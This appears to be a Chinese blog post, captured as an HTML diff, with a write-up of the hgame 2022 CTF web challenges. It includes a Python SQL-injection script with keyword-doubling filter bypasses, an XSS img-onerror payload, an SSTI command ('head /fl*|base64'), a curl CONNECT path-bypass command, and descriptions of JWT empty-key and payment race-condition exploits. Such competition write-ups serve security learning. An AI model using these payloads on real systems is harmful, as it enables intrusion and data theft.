@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="hgame 2022 web带着大一萌新一起看题，边做边记录一下，整体坐下来感觉并不是特别好呢。。。感觉比较坑的题占了一小半的数量。。。不过蹭别人的题就不要再逼逼赖赖了 week1ezauth先试试jwt cracker，然后Ubuntu16.04的openssl的版本是1.0.2，有点古老编译起来之后运行报错，翻下代码能发现是EVP_get_digestbyname这个函数似乎有问题，搜索一下大">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame 2022 web">
+<meta property="og:url" content="https://blog.z3ratu1.cn/hgame2022.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="hgame 2022 web带着大一萌新一起看题，边做边记录一下，整体坐下来感觉并不是特别好呢。。。感觉比较坑的题占了一小半的数量。。。不过蹭别人的题就不要再逼逼赖赖了 week1ezauth先试试jwt cracker，然后Ubuntu16.04的openssl的版本是1.0.2，有点古老编译起来之后运行报错，翻下代码能发现是EVP_get_digestbyname这个函数似乎有问题，搜索一下大">
+<meta property="og:locale">
+<meta property="article:published_time" content="2022-01-25T06:33:02.000Z">
+<meta property="article:modified_time" content="2022-02-23T07:01:11.124Z">
+<meta property="article:author" content="Z3ratu1">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/hgame2022.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>hgame 2022 web | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/hgame2022.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hgame 2022 web
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-25 14:33:02" itemprop="dateCreated datePublished" datetime="2022-01-25T14:33:02+08:00">2022-01-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-23 15:01:11" itemprop="dateModified" datetime="2022-02-23T15:01:11+08:00">2022-02-23</time>
+              </span>
+
+          
+            <span id="/hgame2022.html" class="post-meta-item leancloud_visitors" data-flag-title="hgame 2022 web" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/hgame2022.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/hgame2022.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="hgame-2022-web"><a href="#hgame-2022-web" class="headerlink" title="hgame 2022 web"></a>hgame 2022 web</h1><p>带着大一萌新一起看题，边做边记录一下，整体坐下来感觉并不是特别好呢。。。感觉比较坑的题占了一小半的数量。。。不过蹭别人的题就不要再逼逼赖赖了</p>
+<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="ezauth"><a href="#ezauth" class="headerlink" title="ezauth"></a>ezauth</h3><p>先试试jwt cracker，然后Ubuntu16.04的openssl的版本是1.0.2，有点古老<br>编译起来之后运行报错，翻下代码能发现是<code>EVP_get_digestbyname</code>这个函数似乎有问题，搜索一下大概是这个原因<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/openssl/openssl/issues/6390">https://github.com/openssl/openssl/issues/6390</a></p>
+<p>既然如此就手动更新一下openssl到1.1.1m，也跑不起来。。。恐怕是手动安装的不完善？然后尝试主动调用<code>OpenSSL_add_all_algorithms</code>也报错，懒得深究了，事实证明Ubuntu16.04也许快被时代淘汰了，换到18.04后自带的1.1.1l的openssl就没有问题<br>docker启动。。。<br>docker还卡的要死，用的alpine，得手动apk换源<br>跑了几分钟无果，看起来不是爆破密钥</p>
+<p>空密钥，jwt.io改了直接过，脑溢血脑溢血</p>
+<h3 id="蛛蛛"><a href="#蛛蛛" class="headerlink" title="蛛蛛"></a>蛛蛛</h3><p>观察一下页面就知道每轮只有一个href有内容，匹配一下一路跟进就行了，key目测是随机生成的，防止猜出来key的规律吧？<br>写个简单脚本就能追到，最后的flag在header里</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+
+url <span class="token operator">=</span> <span class="token string">"https://hgame-spider.vidar.club/dfc224a39d"</span>
+
+pattern <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span><span class="token string">"&lt;a href=\"(\?key=.*?)\">"</span><span class="token punctuation">)</span>
+href <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>href<span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        href <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>href<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+</code></pre>
+<h3 id="tetris-plus"><a href="#tetris-plus" class="headerlink" title="tetris plus"></a>tetris plus</h3><p>前端题，给的是HTML就猜出来一半了，开控制台看source里面的js，幸好没加混淆，那个叫check.js的看起来就很像是对比分数的地方，一翻就翻到了5k分的判断语句（翻不到也可以把代码下下来全局搜索，一样的），然后是一个base64的内容，解码出来是flag不在这，但下面有一行注释，看得出来是jsfuck。</p>
+<p>其实也就是js代码，直接复制粘贴在控制台里执行就输出flag了</p>
+<h3 id="fujiwara-tofu-shop"><a href="#fujiwara-tofu-shop" class="headerlink" title="fujiwara tofu shop"></a>fujiwara tofu shop</h3><p>经典http header，但是有点脑洞。</p>
+<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache!"></a>Apache!</h3><p>看描述就能猜出来是Apache的mod_proxy的ssrf，给了一堆配置文件，找到&#x2F;proxy路由是Apache代理的路由，然后payload复制粘贴打通</p>
+<p>比较坑的一点是内网的机子似乎不太稳定，一开始打了好几下没打通，一顿狂打才通了一次</p>
+<h3 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h3><p>理论上来说webpack会超级混淆前端代码使人无法理解，但如果有source map就能还原，然而这里给了sourcemap，理论上来说这是部署错误导致的，可以从sourcemap中还原出原代码。这里base64解一下就有了</p>
+<h3 id="At0m的留言板"><a href="#At0m的留言板" class="headerlink" title="At0m的留言板"></a>At0m的留言板</h3><p>点名批评出题人，强行引流关注公众号<br>就是一个过滤了script标签的xss，一开始没有看见在script里定义的有flag，还以为是个ssti，简单打了两下没反应才看见</p>
+<p>再次点名批评，给的模板中代码写的flag的名字就是flag，打了半天没反应，我还以为打不了，最后老国王提出用img的alt属性来进行回显，发现使用变量时都不会有效，而在不同标签下定义的变量应该是互通的，就感觉不对劲了，最后直接读标签内容才发现出题人flag的名字还藏了一手，恶心人是吧<br><code>&lt;img onerror=&quot;let a=document.getElementsByTagName(&#39;script&#39;)[0].text;this.alt=a&quot; src=&quot;http://aa/&quot; alt=0&gt;</code></p>
+<h3 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h3><p>一SQL注入，替换关键字为空，有回显和部分报错。从error.php那个code那里注的。。。<br>宝可梦选择那不知道能不能注，没测<br>因为有部分报错就能看出来是替换关键字为空，双写即可。</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://121.43.141.153:60056/error.php"</span>
+payload <span class="token operator">=</span> <span class="token string">"1 union select group_concat(table_name),2 from information_schema.tables where table_schema = database()"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"union"</span><span class="token punctuation">,</span> <span class="token string">"uniunionon"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"select"</span><span class="token punctuation">,</span> <span class="token string">"seleselectct"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"or"</span><span class="token punctuation">,</span> <span class="token string">"oorr"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"from"</span><span class="token punctuation">,</span> <span class="token string">"frfromom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"where"</span><span class="token punctuation">,</span> <span class="token string">"whewherere"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"like"</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">"1 union select group_concat(column_name),2 from information_schema.columns where table_name = 'fllllllllaaaaaag'"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"union"</span><span class="token punctuation">,</span> <span class="token string">"uniunionon"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"select"</span><span class="token punctuation">,</span> <span class="token string">"seleselectct"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"or"</span><span class="token punctuation">,</span> <span class="token string">"oorr"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"from"</span><span class="token punctuation">,</span> <span class="token string">"frfromom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"where"</span><span class="token punctuation">,</span> <span class="token string">"whewherere"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"like"</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">"1 union select flag,2 from fllllllllaaaaaag"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"union"</span><span class="token punctuation">,</span> <span class="token string">"uniunionon"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"select"</span><span class="token punctuation">,</span> <span class="token string">"seleselectct"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"or"</span><span class="token punctuation">,</span> <span class="token string">"oorr"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"from"</span><span class="token punctuation">,</span> <span class="token string">"frfromom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"where"</span><span class="token punctuation">,</span> <span class="token string">"whewherere"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"like"</span><span class="token punctuation">)</span>
+res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"code"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+</code></pre>
+<h3 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h3><p>本周唯一有意思一点的题目，就是个反序列化逃逸<br>思路也不是很复杂，因为反序列化是通过<code>|</code>进行分割的，只需要构造一下字符串逃逸出来即可。用脑袋想可能不是很容易想出来，把代码魔改一下对着输出改就会简单很多<br>（这里我忘记序列化最后有一个分号导致多调试了几分钟）</p>
+<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><p>只有两个题了？</p>
+<h3 id="SecurityCenter"><a href="#SecurityCenter" class="headerlink" title="SecurityCenter"></a>SecurityCenter</h3><p>前端源码里面有hint，打开一看意思就是用的twig模板渲染，然后直接复制粘贴一个payload就能打通<br>似乎进行了cat的过滤，也不允许回显有hgame。随便写点破烂绕过。例如<code>head /fl*|base64</code></p>
+<h3 id="Vidar-shop-demo"><a href="#Vidar-shop-demo" class="headerlink" title="Vidar shop demo"></a>Vidar shop demo</h3><p>vue写的前后端分离</p>
+<p>感觉有点像条件竞争？<br>在创建订单和支付订单的时候有几个似乎没有用的参数<br>取消订单的时候会退钱。有一种想法是开了个号用一个号给另一个付钱，然后试试能不能退回来，结果发现不能给其他人付款。那就试试退钱的时候能不能竞争一下退两份钱</p>
+<p>果然，写了个非常破烂的脚本都能竞争起来。。。<br>还是想办法写一个牛逼一点的竞争脚本吧。。。</p>
+<p>说起来强有力的新生@黎明余光同学发现了一个非预期，在前端翻接口翻到了一个<code>/api/pay/callback</code>。然后对着这个接口发一个订单号就能直接把这个订单变成已支付状态。第一反应官方后门？<br>出题方的解释是该接口忘记做权限限制了，但从安全的角度考虑这段代码的意义非常不明。如果是用于在支付成功后服务端访问该接口进行订单状态修改，那为什么不直接把这段逻辑塞到对应位置而是多写一个API呢？</p>
+<p>后来学弟和我说他们这个是从哪抄的代码套用的。。。我就知道，然后学弟发现了另一个非预期，申请的订单不支付也能直接通过API取消，取消了也退钱。。。</p>
+<p>以及这里的竞争是竞争付款。不是退款。在付款处sleep了0.5s，导致用手点都能竞争成功</p>
+<h3 id="还有个啥SQLite注入题，后来上的没看"><a href="#还有个啥SQLite注入题，后来上的没看" class="headerlink" title="还有个啥SQLite注入题，后来上的没看"></a>还有个啥SQLite注入题，后来上的没看</h3><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><p>赛题质量再次变得玄幻？感觉出题人有点技穷了</p>
+<h3 id="Markdown-Online"><a href="#Markdown-Online" class="headerlink" title="Markdown Online"></a>Markdown Online</h3><p>看起来像原型链污染，仔细看一下又感觉不像</p>
+<p>先绕过登录，登录这里是利用try catch直接过检测登进去，理论上来说try catch应该直接返回个报错退出的，这里啥都没做，那就只要进了catch检测无所谓了，因为没看见用express的经典json解析，想着整一个数组试试，结果直接提示用json，那我就不客气了。仔细一看才发现是自己写了个json解析</p>
+<p>看起来有一个究极原型链污染的点<code>deap.merge(&#123;&#125;, JSON.parse(buffer.toString()))</code>，并且这个地方是自己实现的json解析，看起来就很有洞。结果跟进去这个deap库一看，遍历用的Object.keys，那就没打头了。并且搜索这个库也没有发现原型链污染相关的漏洞。</p>
+<p>然后就是看后面的zombie，这个rce是祥云杯出过的，见过，但是说起来好像不是很好搜。。。这里就是加了点过滤，不给用加号用String.concat绕过即可。（这里用的祥云杯上找的老payload，有点长，学弟直接用的eval。。。方便多了，没注意看）</p>
+<p>但是这里又出现了各种无法理解的坑，比如本地通了远程不通之类的。然后搭了个docker，本地docker通了远程不通。最后问了下学弟发现他用的execSync就能通，我用的spawnSync就不能通。sleep延时成功了，但是不知道机器通不通外网，同样的本地机器通了，远程机器shell弹不出来。总不能让我盲注读flag吧。没那个耐心，告辞</p>
+<h3 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h3><p>看起来是个xxe，有一堆过滤，但最后拿flag的条件很简单。实体编码就直接过了。。。flag给了个提示好像要我用什么奇怪的协议？没仔细看</p>
+<h3 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h3><p>这个题单出出来难度-&gt;正无穷。不过对于赛棍而言就是秒杀了。。。因为这个题是有一个国际赛上出的。我看这个题差不多出了30个人。。。但是我印象里国际赛的时候解题人数应该不会比现在多。希望是大家的搜索能力有所提升。说起来这搜我也感觉不是很好搜来着。我自己都找不到是哪场比赛里出现的了</p>
+<p>并且对于萌新而言这个题目太抽象了。萌新能看懂发生了什么吗？<br>起了一个文件服务器，然后把flag文件整了个对应的路由，这样子访问那个路径就是访问对应的路由了，从而拿不到flag<br>以及最后听的端口是8889，但我实际访问的是80。真就整个nginx反带一堆？真有耐心啊<br><code>curl --path-as-is -X CONNECT http://db907b5a72.filesystem.hgame.homeboyc.cn/./there_may_be_a_flag</code><br>实际打法就是那个比赛的payload，直接connect方法打通<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://book.hacktricks.xyz/pentesting/pentesting-web/golang">https://book.hacktricks.xyz/pentesting/pentesting-web/golang</a></p>
+<p>说起来到底是哪场比赛来着。。。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BRWCTF2021%5Dwp.html" rel="prev" title="[RWCTF2021]wp">
+      <i class="fa fa-chevron-left"></i> [RWCTF2021]wp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/DiceCTF2022%E7%A9%B6%E6%9E%81%E5%9D%90%E7%89%A2.html" rel="next" title="DiceCTF2022究极坐牢">
+      DiceCTF2022究极坐牢 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hgame-2022-web"><span class="nav-number">1.</span> <span class="nav-text">hgame 2022 web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#week1"><span class="nav-number">1.1.</span> <span class="nav-text">week1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ezauth"><span class="nav-number">1.1.1.</span> <span class="nav-text">ezauth</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%9B%9B%E8%9B%9B"><span class="nav-number">1.1.2.</span> <span class="nav-text">蛛蛛</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tetris-plus"><span class="nav-number">1.1.3.</span> <span class="nav-text">tetris plus</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fujiwara-tofu-shop"><span class="nav-number">1.1.4.</span> <span class="nav-text">fujiwara tofu shop</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#week2"><span class="nav-number">1.2.</span> <span class="nav-text">week2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache"><span class="nav-number">1.2.1.</span> <span class="nav-text">Apache!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#webpack-engine"><span class="nav-number">1.2.2.</span> <span class="nav-text">webpack-engine</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#At0m%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF"><span class="nav-number">1.2.3.</span> <span class="nav-text">At0m的留言板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pokemon"><span class="nav-number">1.2.4.</span> <span class="nav-text">Pokemon</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E6%9C%AC%E5%8D%95%E8%AF%8D%E4%B9%A6"><span class="nav-number">1.2.5.</span> <span class="nav-text">一本单词书</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#week3"><span class="nav-number">1.3.</span> <span class="nav-text">week3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SecurityCenter"><span class="nav-number">1.3.1.</span> <span class="nav-text">SecurityCenter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Vidar-shop-demo"><span class="nav-number">1.3.2.</span> <span class="nav-text">Vidar shop demo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%98%E6%9C%89%E4%B8%AA%E5%95%A5SQLite%E6%B3%A8%E5%85%A5%E9%A2%98%EF%BC%8C%E5%90%8E%E6%9D%A5%E4%B8%8A%E7%9A%84%E6%B2%A1%E7%9C%8B"><span class="nav-number">1.3.3.</span> <span class="nav-text">还有个啥SQLite注入题，后来上的没看</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#week4"><span class="nav-number">1.4.</span> <span class="nav-text">week4</span></a><ol 